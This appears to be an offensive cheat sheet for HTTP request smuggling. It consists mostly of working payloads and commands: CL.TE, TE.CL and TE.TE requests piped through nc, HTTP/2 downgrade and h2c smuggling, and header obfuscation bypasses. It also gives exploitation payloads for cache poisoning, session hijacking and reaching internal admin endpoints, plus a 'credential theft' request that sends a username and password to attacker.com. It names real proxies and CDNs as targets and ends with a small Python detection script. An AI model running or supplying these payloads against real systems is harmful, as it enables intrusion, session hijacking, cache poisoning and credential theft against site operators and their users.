#### 1. BASIC DETECTION TECHNIQUES
# CL.TE Smuggling (Frontend: Content-Length, Backend: Transfer-Encoding)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc target.com 80

# TE.CL Smuggling (Frontend: TE, Backend: CL)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nSMUGG\r\n0\r\n\r\n' | nc target.com 80

# TE.TE with obfuscation
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.com\r\n\r\n0\r\n\r\n' | nc target.com 80

#### 2. AUTOMATED TOOLS
# Smuggler (Python3)
python3 smuggler.py -u https://target.com --scan

# Request Smuggler (Burp Extension)
# Available in BApp Store

# h2smuggler (HTTP/2 Smuggling)
python3 h2smuggler.py -x https://target.com

#### 3. EXPLOITATION TECHNIQUES
# Cache Poisoning
GET / HTTP/1.1\r\nHost: target.com\r\n\r\nGET /poisoned HTTP/1.1\r\nHost: target.com\r\n\r\n

# Session Hijacking
POST /login HTTP/1.1\r\nHost: target.com\r\nContent-Length: 28\r\n\r\nusername=admin&password=123GET /admin HTTP/1.1\r\nHost: target.com\r\nCookie: session=ADMIN_SESSION\r\n\r\n

# Bypass Security Frontends
GET /admin HTTP/1.1\r\nHost: internal-api\r\n\r\n

#### 4. HTTP/2 SPECIFIC ATTACKS
# HTTP/2 Downgrade Smuggling
:method POST
:path /
:authority target.com
content-length: 41
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: internal

# H2C Smuggling (Cleartext HTTP/2)
curl --http2-prior-knowledge -x http://target.com http://backend/internal -H "Foo: bar\x0D\x0ASmuggled: true"

#### 5. BYPASS TECHNIQUES
# Header Spacing
Transfer-Encoding: chunked
Transfer-Encoding : chunked

# Case Manipulation
transfer-encoding: chunked
TrAnSfEr-EnCoDiNg: chunked

# Duplicate Headers
Transfer-Encoding: chunked
Transfer-Encoding: identity

#### 6. DETECTION METHODS
# Timing Differences
time curl -X POST https://target.com -H "Transfer-Encoding: chunked" -H "Content-Length: 6" -d "0\r\n\r\nG"

# Differential Responses
curl -i https://target.com -H "Foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com"

# H2 Detection
openssl s_client -connect target.com:443 -servername target.com -alpn h2

#### 7. POST-EXPLOITATION
# Credential Theft
GET /login HTTP/1.1\r\nHost: target.com\r\n\r\nPOST /log HTTP/1.1\r\nHost: attacker.com\r\nContent-Length: 100\r\n\r\nusername=ADMIN&password=PASSWORD

# Web Cache Deception
GET /account-settings HTTP/1.1\r\nHost: target.com\r\n\r\nGET /profile HTTP/1.1\r\nHost: target.com\r\n\r\n

# #### PRO TIPS:
# 1. Always test:
#  - Both HTTP/1.1 and HTTP/2 endpoints
#  - Different header combinations
#  - Frontend/backend discrepancies
#  - Time-based detection

# 2. Critical targets:
#  - Reverse proxies (Nginx, HAProxy)
#  - CDNs (Cloudflare, Akamai)
#  - Load balancers
#  - API gateways

# 3. Escalation paths:
#  - Bypass security controls
#  - Access internal endpoints
#  - Poison caching systems
#  - Hijack user sessions

# #### RECOMMENDED PAYLOADS:
#  - CL.TE: `Content-Length: X` with chunked body
#  - TE.CL: `Transfer-Encoding: chunked` with CL
#  - TE.TE: Conflicting TE headers
#  - HTTP/2: Downgrade attacks

#### SAMPLE DETECTION SCRIPT:
```python
# smuggler_detector.py
import socket
import time

def test_smuggling(target, port=80):
    # CL.TE test
    clte_payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\nG"
    ).format(target)
    
    start = time.time()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(clte_payload.encode())
    response = s.recv(4096)
    elapsed = time.time() - start
    
    if elapsed > 3:  # Threshold for delayed response
        print(f"Possible CL.TE Smuggling - Response time: {elapsed}")
    else:
        print("No CL.TE vulnerability detected")
```